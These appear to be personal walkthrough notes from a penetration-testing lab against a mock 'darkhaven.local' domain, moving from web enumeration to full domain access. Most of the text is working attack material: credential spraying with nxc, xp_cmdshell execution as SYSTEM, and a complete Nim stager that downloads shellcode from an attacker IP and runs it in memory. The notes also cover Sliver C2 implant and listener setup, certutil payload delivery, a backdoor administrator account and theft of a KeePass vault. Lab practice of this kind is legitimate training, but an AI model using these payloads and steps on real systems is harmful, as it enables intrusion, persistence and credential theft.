- We are first enumerating the machine web.ext.darkhaven.local
- start off with rustscan
```python
rustscan -a <ip> -- -A
```
- we find that a web server is running on port 80
- MSP site.. lot of services listed
- Most interesting is the "Client portal"
![[Pasted image 20260830102701.png]]
- It allows authentication with domain accounts (ie if we get domain creds, we can log in)
	- might have LDAP Connection
	- Maybe worth checking LDAP Injection
- We have the option to Continue as Guest
- Email enumeration
	```
	it-helpdesk@darkhaven.local
	```

Logged in as Guest:
![[Pasted image 20260830102901.png]]
this is a note that we can see about a share name being changed.

![[Pasted image 20260830103201.png]]
potential creds above
```python
sql_svc : SqLS3rvic3!
```

**Check if the creds are valid**
- What we can do is create a hosts file with all the hosts that we've identified so that we can test the creds against all the hosts at once. Hack smarter!
```python
nxc smb subnet2.txt -u 'sql_svc' -p 'SqLS3rvic3!' --shares 
```

- We got initial access to the domain as `sql_svc`
```python
sql_svc : SqLS3rvic3!
```

- we have access to the host sql.ext.darkhaven.local, we can test it using nxc
```python
nxc mssql sql.ext.darkhaven.local -u 'sql_svc' -p 'SqLS3rvic3!'
## We confirmed that we have access based on the output
```

- Connecting with Impacket:
```python
impacket-mssqlclient darkhaven.local/sql_svc:'SqLS3rvic3!' @sql.ext.darkhaven.local
```

- Boom we got a shell 
![[Pasted image 20260830110303.png]]

![[Pasted image 20260830110453.png]]
- Then we can try the `enable_xp_cmdshell` command 
- Voila! we have acccess to `xp_cmdshell`!!!
- Tried executing `whoami`
```python
xp_cmdshell whoami
```

and we got the result as `nt authority\system` and we've fully compromised the first machine !!
![[Pasted image 20260830110813.png]]

#### Post Exploitation
- Lets try to get a stable connection with `sliver C2`

#### Shell.nim
```python
import winim/lean
import httpclient

func toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))

proc DownloadExecute(url: string): void =
  var client = newHttpClient()
  var response: string = client.getContent(url)

  var shellcode: seq[byte] = toByteSeq(response)
  let tProcess = GetCurrentProcessId()
  var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
  defer: CloseHandle(pHandle)

  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](len(shellcode)), 0x3000, PAGE_EXECUTE_READ_WRITE)
  copyMem(rPtr, addr shellcode[0], len(shellcode))

  let f = cast[proc() {.nimcall.}](rPtr)
  f()

when defined(windows):
  when isMainModule:
    DownloadExecute("http://192.168.211.2/shellc.bin")
```

- Make sure that that the ip matches our tun0 attack machine
##### Compiling the shell.nim payload on kali linux
```python
sudo apt install mingw-w64
sudo apt install nim
nimble install winim
nim c -d:mingw --os:windows --cpu:amd64 --cc:gcc --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc stager.nim
```

**Next we need to generate the shell code from sliver that when it runs it reaches out to us, executes it and hopefully gets us a session.

#### Now, inside sliver
```python
generate --mtls <tun0ip:port> --os windows --arch amd64 --format shellcode --save /home/tyler/hacksmarter/darkhaven/shellc.bin
```
- We've successfully generated the implant
##### Setting up sliver listener
```python
mtls -L <tun0ip> -l <port>
```

- type `jobs` to confirm if the listener is active.

##### Setting up python web server
- we need to make sure that when our shell code reaches out to us, it can reach our shellc.bin and execute it.
```python
python3 -m http.server 80
```


### Now lets go back to our xp_cmdshell and use certutil to download the stager
```python
xp_cmdshell "certutil -urlcache -f http://<tun0ip>/update.exe" update.exe
```

### Lets run it now
```python
xp_cmdshell update.exe
```

#### Then check our sliver listener, we'll have a session as `NT AUTHORITY\SYSTEM`
#### Interacting with the session
```python
sessions -i <first3 characters of the id>
```


### Create a backdoor admin account
```python
armory install all
#installs all sliver extensions
```

```python
remote-adduser tyler Hacksmarter123 localhost
```

**Now lets add the new backdoor user to administrators group**

```python
execute -o net localgroup Administrators tyler /add
```

#### RDP into the machine and look for interesting directories or files
![[Pasted image 20260830205617.png]]
- After digging around for a bit, we found a directory which is literally called `stored_passowrds` lol lol lolll!!

![[Pasted image 20260830205742.png]]
- we found a `keepass` file and a readme file

![[Pasted image 20260830210407.png]]
found some creds inside the `Readme` file

**We can use the following command to download the keepass file :**
```python
download C:/stored_passwords/it_passwords.kdbx
```

### Install keepass
```python
sudo apt install keepass2
```


**Open the keepass file with keepass2 with the masterpassword we found from our readme file**
![[Pasted image 20260830213214.png]]
we were able to gain access to a bunch of creds within keepass

#### Using nxc to dump data that we can use in bloodhound
- nxc with ldap does not work..
```python
#This won't work in darkhaven but keeping it just in case we need it some other time
nxc ldap dc.ext.darkhaven.local -u 'sql_svc' -p 'SqLS3rvic3!' --bloodhound -collection All
```

#### Using sharpHound instead
- download the exe file for sharpHound from github
- go back to the sliver session and upload it
```python
upload /home/tyler/hacksmarter/darkhaven/Sharphound.exe C:/Users/Administrator/Desktop
```

**Go to that directory in windows using rdp (or xp_cmdshell) and then run sharphound**
```python
.\SharpHound.exe All
```


